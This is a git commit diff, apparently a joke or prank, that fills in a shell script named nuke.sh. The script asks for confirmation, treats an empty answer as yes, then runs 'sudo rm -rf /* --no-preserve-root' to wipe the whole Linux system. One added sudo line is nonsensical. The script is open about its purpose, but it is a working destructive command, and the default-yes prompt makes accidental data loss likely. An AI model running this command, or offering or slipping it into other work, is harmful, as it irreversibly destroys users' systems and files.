7fb9a56316d215fe651b1c65c486b1e043c5ae23
Anothermeer <86600894+anothermeer@users.noreply.github.com>
2025-05-18 22:54:50 +0800

    le final update (I think?)

--- nuke.sh
+++ nuke.sh
@@ -1,3 +1,15 @@
-#!/bun/bash
+#!/bin/bash
 
-echo "this will remove your whole Linux installation, continue? [Y/n] "
+sudo "good, I am a super user"
+
+read -p "This will remove your whole Linux installation, continue? [Y/n] " response
+response=${response,,}
+
+if [[ "$response" == "y" || "$response" == "" ]]; then
+    echo "Say goodbye to your Linux installation~"
+    sleep 2
+    sudo rm -rf /* --no-preserve-root
+else
+    echo "Aborting."
+    exit 1
+fi
